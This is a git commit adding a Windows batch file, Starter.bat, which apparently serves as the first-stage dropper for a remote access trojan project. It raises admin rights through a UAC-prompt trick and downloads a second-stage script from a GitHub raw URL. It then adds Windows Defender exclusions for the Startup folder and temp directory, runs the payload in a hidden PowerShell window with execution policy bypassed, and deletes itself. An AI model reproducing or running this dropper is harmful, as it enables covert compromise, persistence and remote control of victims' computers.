41e2ed1f0204d9150410561a6d3adeda9c06312c
saif <saif.aboueldahab@gmail.com>
2023-05-25 20:26:58 +0300

    sa

---
+++ Starter.bat
@@ -0,0 +1,32 @@
+@REM TODO: add UAC bypass
+
+@REM change me
+set "username=saifa"
+@echo off
+:: BatchGotAdmin
+:-------------------------------------
+if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
+>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
+) else (
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system")
+if '%errorlevel%' NEQ '0' (
+    echo Request admin priv
+    goto UACPrompt
+) else ( goto gotAdmin )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set params= %*
+    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+    pushd "%CD%"
+    CD /D "%~dp0"
+
+powershell powershell.exe -windowstyle hidden "wget https://raw.githubusercontent.com/saifnasef/RAT/main/secondary.bat -o secondary.bat"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; Add-MpPreference -ExclusionPath "$env:temp"
+powershell powershell.exe -windowstyle hidden -ep bypass ./secondary.bat
+del Starter.bat
